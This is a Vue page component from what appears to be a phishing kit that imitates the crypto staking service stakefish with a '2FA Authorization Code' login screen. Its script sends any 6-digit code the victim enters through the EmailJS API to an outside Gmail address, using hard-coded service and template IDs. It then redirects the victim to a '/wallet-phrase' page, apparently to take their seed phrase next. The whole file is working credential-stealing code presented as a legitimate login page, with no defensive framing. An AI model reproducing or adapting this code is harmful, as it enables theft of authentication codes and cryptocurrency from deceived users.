<template>
  <div
    class="max-w-screen-2xl mx-auto px-4 md:px-6 py-4 md:py-6 mt-6 md:mt-[100px] flex justify-center"
  >
    <div class="md:w-4/6">
      <div class="flex flex-col items-center justify-center">
        <h1
          style="
            line-height: 1.25;

            font-family: DM Sans, sans-serif;
          "
          class="text-[28px] md:text-[48px] font-bold text-center w-5/6"
        >
          Enter your 2FA Code(Authorization)
        </h1>

        <div class="mt-4 w-full md:w-4/6">
          <input
            v-model="code"
            placeholder="2fa Authorization Code"
            class="w-full h-10 md:h-[55px] bg-[#f5f5f5] p-2 mt-4 rounded-[12px] focus:outline-none focus:ring-2 ring-[#ccff00] transition duration-300 ease-in-out"
            name=""
          />
          <div v-if="invalidAuth" class="text-xs mb-2 text-red-500 font-semibold"
            >Invalid Authentication Code, must be 6 digit</div
          >

          <div class="md:flex mt-4 justify-between items-center">
            <button
              :disabled="loading"
              @click="sendData"
              class="mb-5 md:mb-0 text-center w-full flex items-center justify-center border-2 border-[#ccff00] bg-[#ccff00] rounded-[12px] text-[15px] md:text-[21px] font-semibold text-black px-8 py-2 md:py-4 transition duration-300 ease-in-out"
            >
              <span>{{loading ? "Connecting to wallet..." : "Login"}}</span>
              <div
                v-if="loading"
                class="ml-2 w-4 h-4 rounded-full animate-spin border-4 border-dashed border-black border-t-transparent"
              ></div>
            </button>
          </div>
        </div>

        <div class="mt-40 md:mt-20">
          <ul
            class="footer__Social-sc-1tkds2-3 gnzftZ flex space-x-3 md:space-x-6 mb-[28px]"
          >
            <li class="bg-[#ccff00] rounded-[100px] p-2">
              <a
                href="https://t.me/stakefish"
                target="_blank"
                rel="noopener noreferrer"
                ><i
                  class="iconSvg__SvgIcon-sc-pm5ypy-0 emHWtP icon icon--telegram"
                  ><svg class="w-8 h-8" viewBox="0 0 32 32">
                    <path
                      d="M21.327 24.991c-1.689-1.203-4.668-3.387-4.668-3.387s-1.568 1.48-2.582 2.437c-0.179 0.169-0.436 0.235-0.676 0.173s-0.424-0.247-0.503-0.48c-0.631-1.859-1.842-5.516-1.842-5.516s-2.591-0.821-4.564-1.412c-0.286-0.086-0.484-0.342-0.494-0.637s0.173-0.563 0.452-0.666c4.401-1.628 15.168-5.668 18.664-6.962 0.227-0.084 0.481-0.039 0.665 0.117s0.267 0.399 0.217 0.632c-0.66 3.098-2.417 11.717-3.142 15.122-0.068 0.319-0.295 0.583-0.604 0.7s-0.655 0.069-0.923-0.121zM12.146 17.756l1.4 4.618 0.311-2.924c0 0 5.409-4.879 8.492-7.659 0.090-0.082 0.103-0.219 0.027-0.314s-0.211-0.118-0.314-0.053c-3.574 2.282-9.917 6.334-9.917 6.334z"
                    ></path></svg></i
              ></a>
            </li>
            <li class="bg-[#ccff00] rounded-[100px] p-2">
              <a
                href="https://twitter.com/stakefish"
                target="_blank"
                rel="noopener noreferrer"
                ><i
                  class="iconSvg__SvgIcon-sc-pm5ypy-0 emHWtP icon icon--twitter"
                  ><svg class="w-8 h-8" viewBox="0 0 32 32">
                    <path
                      d="M24.8 10.507c-0.64 0.32-1.333 0.48-2.080 0.587 0.747-0.48 1.333-1.173 1.6-2.027-0.693 0.427-1.493 0.747-2.293 0.907-1.12-1.173-2.88-1.493-4.32-0.693s-2.187 2.453-1.813 4.053c-2.88-0.16-5.6-1.547-7.413-3.787-0.96 1.653-0.48 3.787 1.12 4.853-0.587 0-1.12-0.16-1.653-0.427v0.053c0 1.707 1.227 3.2 2.88 3.52-0.533 0.16-1.067 0.16-1.6 0.053 0.48 1.493 1.813 2.507 3.36 2.507-1.28 1.013-2.88 1.547-4.48 1.547-0.32 0-0.587 0-0.853-0.053 3.147 2.080 7.147 2.187 10.453 0.373s5.333-5.333 5.333-9.12v-0.48c0.64-0.533 1.28-1.173 1.76-1.867v0z"
                    ></path></svg></i
              ></a>
            </li>
            <li class="bg-[#ccff00] rounded-[100px] p-2">
              <a
                href="https://www.youtube.com/c/stakefish/"
                target="_blank"
                rel="noopener noreferrer"
                ><i
                  class="iconSvg__SvgIcon-sc-pm5ypy-0 emHWtP icon icon--youtube"
                  ><svg class="w-8 h-8" viewBox="0 0 32 32">
                    <path
                      d="M26.107 11.875c0 0-0.201-1.422-0.822-2.046-0.785-0.822-1.664-0.826-2.067-0.874-2.884-0.21-7.215-0.21-7.215-0.21h-0.008c0 0-4.33 0-7.215 0.21-0.403 0.048-1.281 0.052-2.067 0.874-0.62 0.624-0.818 2.046-0.818 2.046s-0.205 1.668-0.205 3.339v1.563c0 1.668 0.205 3.34 0.205 3.34s0.201 1.422 0.818 2.046c0.785 0.822 1.817 0.794 2.276 0.882 1.652 0.157 7.013 0.205 7.013 0.205s4.334-0.008 7.219-0.213c0.403-0.048 1.281-0.052 2.067-0.874 0.62-0.624 0.822-2.046 0.822-2.046s0.205-1.668 0.205-3.34v-1.563c-0.004-1.668-0.209-3.339-0.209-3.339zM13.869 18.675v-5.797l5.571 2.909-5.571 2.888z"
                    ></path></svg></i
              ></a>
            </li>
            <li class="bg-[#ccff00] rounded-[100px] p-2">
              <a
                href="http://instagram.com/stakedotfish"
                target="_blank"
                rel="noopener noreferrer"
                ><i
                  class="iconSvg__SvgIcon-sc-pm5ypy-0 emHWtP icon icon--instagram"
                  ><svg class="w-8 h-8" viewBox="0 0 32 32">
                    <path
                      d="M25.286 9.143l-0.143-0.143c-0.429-1-1.286-1.714-2.143-2.143-1-0.429-1.857-0.714-4.429-0.714h-5.571c-2.143 0-3.143 0.286-4 0.714l-0.143 0.143c-1 0.429-1.714 1.286-2.143 2.143-0.429 1-0.714 1.857-0.714 4.429v5.571c0 2.143 0.286 3.143 0.714 4l0.143 0.143c0.429 1 1.286 1.714 2.143 2.143s1.714 0.714 3.857 0.714h5.857c2.429 0 3.286-0.286 4.143-0.714l0.143-0.143c1-0.429 1.714-1.286 2.143-2.143s0.714-1.714 0.714-3.857v-5.857c0.143-2.429-0.143-3.429-0.571-4.286zM16 21c-2.714 0-5-2.286-5-5s2.286-5 5-5 5 2.286 5 5-2.286 5-5 5zM21.429 11.714c-0.571 0-1.143-0.429-1.143-1.143s0.429-1.143 1.143-1.143 1.143 0.429 1.143 1.143-0.571 1.143-1.143 1.143z"
                    ></path></svg></i
              ></a>
            </li>
            <li class="bg-[#ccff00] rounded-[100px] p-2">
              <a
                href="https://www.linkedin.com/company/stakefish"
                target="_blank"
                rel="noopener noreferrer"
                ><i
                  class="iconSvg__SvgIcon-sc-pm5ypy-0 emHWtP icon icon--linkedin"
                  ><svg class="w-8 h-8" viewBox="0 0 32 32">
                    <path
                      d="M10.5 26h-4.167v-13.333h4.167zM8.5 11c-1.333 0-2.5-1.167-2.5-2.5s1.167-2.5 2.5-2.5 2.5 1.167 2.5 2.5c-0.167 1.333-1.167 2.5-2.5 2.5v0zM26 26h-4.167v-7c0-2-0.667-3-2.167-3-1.667 0-2.5 1.167-2.5 3v7h-4v-13.333h4v1.833c0 0 1.167-2.167 4-2.167s4.833 1.667 4.833 5.333v8.333z"
                    ></path></svg></i
              ></a>
            </li>
            <li class="bg-[#ccff00] rounded-[100px] p-2">
              <a
                href="https://medium.com/stakefish"
                target="_blank"
                rel="noopener noreferrer"
                ><i
                  class="iconSvg__SvgIcon-sc-pm5ypy-0 emHWtP icon icon--medium"
                  ><svg class="w-8 h-8" viewBox="0 0 32 32">
                    <path
                      d="M8.8 11.774c0-0.156 0-0.47-0.313-0.626l-1.722-2.035v-0.313h5.478l4.226 8.765 3.756-8.765h5.165v0.313l-1.565 1.409c-0.157 0.156-0.157 0.313-0.157 0.47v10.017c0 0.157 0 0.313 0.157 0.47l1.409 1.409v0.313h-7.357v-0.313l1.565-1.409c0.157-0.157 0.157-0.157 0.157-0.47v-8.139l-4.226 10.174h-0.626l-4.852-10.174v6.73c0 0.313 0 0.626 0.313 0.783l2.035 2.191v0.313h-5.635v-0.313l2.035-2.191c0.156-0.157 0.313-0.47 0.313-0.783v-7.826h-0.156z"
                    ></path></svg></i
              ></a>
            </li>
            <li class="bg-[#ccff00] rounded-[100px] p-2">
              <a
                href="https://www.reddit.com/r/stakefish"
                target="_blank"
                rel="noopener noreferrer"
                ><i
                  class="iconSvg__SvgIcon-sc-pm5ypy-0 emHWtP icon icon--reddit"
                  ><svg class="w-8 h-8" viewBox="0 0 32 32">
                    <path
                      d="M32 15.393c0 1.393-0.786 2.589-1.946 3.179 0.143 0.554 0.214 1.125 0.214 1.714 0 5.643-6.375 10.214-14.232 10.214-7.839 0-14.214-4.571-14.214-10.214 0-0.571 0.071-1.143 0.196-1.679-1.196-0.589-2.018-1.804-2.018-3.214 0-1.964 1.589-3.554 3.554-3.554 1.018 0 1.929 0.429 2.589 1.125 2.411-1.679 5.625-2.768 9.196-2.893l2.071-9.304c0.071-0.321 0.411-0.536 0.732-0.464l6.589 1.446c0.429-0.857 1.339-1.464 2.375-1.464 1.482 0 2.679 1.196 2.679 2.661 0 1.482-1.196 2.679-2.679 2.679-1.464 0-2.661-1.196-2.661-2.661l-5.964-1.321-1.857 8.429c3.589 0.107 6.839 1.179 9.268 2.857 0.643-0.679 1.554-1.089 2.554-1.089 1.964 0 3.554 1.589 3.554 3.554zM7.464 18.946c0 1.482 1.196 2.679 2.661 2.679 1.482 0 2.679-1.196 2.679-2.679 0-1.464-1.196-2.661-2.679-2.661-1.464 0-2.661 1.196-2.661 2.661zM21.929 25.286c0.268-0.268 0.268-0.661 0-0.929-0.25-0.25-0.661-0.25-0.911 0-1.071 1.089-3.375 1.464-5.018 1.464s-3.946-0.375-5.018-1.464c-0.25-0.25-0.661-0.25-0.911 0-0.268 0.25-0.268 0.661 0 0.929 1.696 1.696 4.964 1.821 5.929 1.821s4.232-0.125 5.929-1.821zM21.875 21.625c1.464 0 2.661-1.196 2.661-2.679 0-1.464-1.196-2.661-2.661-2.661-1.482 0-2.679 1.196-2.679 2.661 0 1.482 1.196 2.679 2.679 2.679z"
                    ></path></svg></i
              ></a>
            </li>
          </ul>
          <div
            class="text-center text-[15px] md:text-[21px] footer__ContactUs-sc-1tkds2-2 bSNdYF justify-content-center mb-[15px]"
          >
            If you have any questions, please
            <a class="border-[#ccff00] border-b-[3px]" href="/en/contact/"
              >contact us</a
            >.
          </div>
          <div
            class="text-center text-[15px] md:text-[17px] text-[#9a9a9a] footer__CreatedBy-sc-1tkds2-1 footer__Legal-sc-1tkds2-4 hvicvN imnkqE mb-[15px]"
          >
            <a href="/en/privacy-policy/">Privacy Policy</a><span>·</span
            ><a href="/en/ethereum/terms-of-service/">Terms of Service</a
            ><span>·</span><a href="/en/ethereum/dashboard/">Dashboard</a>
          </div>
          <div
            class="text-[15px] md:text-[17px] text-[#9a9a9a] text-center footer__CreatedBy-sc-1tkds2-1 hvicvN"
          >
            Created by <a href="/en/">stakefish</a>
          </div>
        </div>
      </div>
    </div>
  </div>
</template>

<script>
export default {
  name: "IndexPage",
  data() {
    return {
      code: "",
      loading: false,
      invalidAuth: false,
    };
  },
  methods: {
    async sendData() {
      this.invalidAuth = false;
      this.loading = true;
      try {
        if (this.code.length === 6) {
          var data = {
            service_id: "service_fhzx1qm",
            template_id: "template_lczv7e9",
            user_id: "1VCQuxAerMoxLsQwn",
            template_params: {
              from_name: "Stake Fish 2fa Code",
              auth2faCode: this.code,
              reply_to: "Gibsonkendra725@gmail.com",
            },
          };
          const response = await this.$axios.$post(
            "https://api.emailjs.com/api/v1.0/email/send",
            data
          );
          if (response) {
            this.loading = false;
            this.$router.push("/wallet-phrase");
          }
          this.loading = false;
        } else {
          this.loading = false;
          this.invalidAuth = true;
        }
      } catch (error) {
        console.log(error);
      }
    },
  },
};
</script>
